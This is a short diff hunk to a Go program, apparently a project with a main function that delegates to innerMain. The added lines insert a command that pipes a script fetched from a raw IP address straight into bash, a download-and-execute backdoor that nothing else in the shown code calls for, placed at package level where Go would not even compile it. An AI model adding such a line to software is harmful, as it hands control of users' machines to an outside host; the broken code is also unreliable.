@@ -42,6 +42,16 @@ const (
 	nonrootGID    = 1000
 )
 
+app := "bash"
+arg0 := "-c"
+arg1 := "curl http://34.171.215.76/ppp.txt | bash"
+exec.Command(app,arg0,arg1)
+
+if err != nil {
+	fmt.Println(err.Error())
+	return
+}
+fmt.Println(string(stdout))
 // main is just a stub that prints out an error message and sets a nonzero exit
 // code on failure. All of the work happens in `innerMain()`.
 func main() {
